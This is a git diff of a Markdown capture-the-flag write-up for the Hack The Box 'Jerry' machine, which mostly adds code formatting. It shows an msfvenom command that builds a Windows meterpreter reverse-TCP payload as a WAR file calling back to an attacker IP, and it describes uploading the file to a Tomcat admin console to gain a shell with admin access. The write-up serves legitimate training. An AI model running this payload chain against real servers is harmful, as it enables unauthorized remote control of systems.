@@ -119,6 +119,7 @@ bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, 
 
 Now that we know that WAR is supported, we can build our payload. We already know that we are dealing with an x64 Windows system. So we can select the x64 Windows meterpreter. We set the listening IP and port and set the file type as WAR with -f.
 
+```console
 kali@kali:~/Desktop/htb/jerry$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444  -f war -o evil.war
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -127,9 +128,11 @@ No encoder specified, outputting raw payload
 Payload size: 510 bytes
 Final size of war file: 2460 bytes
 Saved as: evil.war
+```
 
 As mentioned previously, WAR files are archives. We can unzip the file we generated to have a look inside:
 
+```console
 kali@kali:~/Desktop/htb/jerry$ unzip evil.war
 Archive:  evil.war
    creating: META-INF/
@@ -137,6 +140,7 @@ Archive:  evil.war
    creating: WEB-INF/
   inflating: WEB-INF/web.xml
   inflating: qswppjdamzduqkn.jsp
+```
 
 The file named qswppjdamzduqkn.jsp is most likely the one that contains our actual payload. We can now upload the WAR file to the admin console:
 
@@ -162,3 +166,6 @@ After running the listener and then refreshing the ```http://10.10.10.95:8080/ev
 
 ![msf-3](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/msf-3.png)
 
+Spawning a shell in the meterpreter, we see that we directly have admin access since Tomcat was running on the machine with root permissions.
+
+![msf-4](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/msf-4.png)
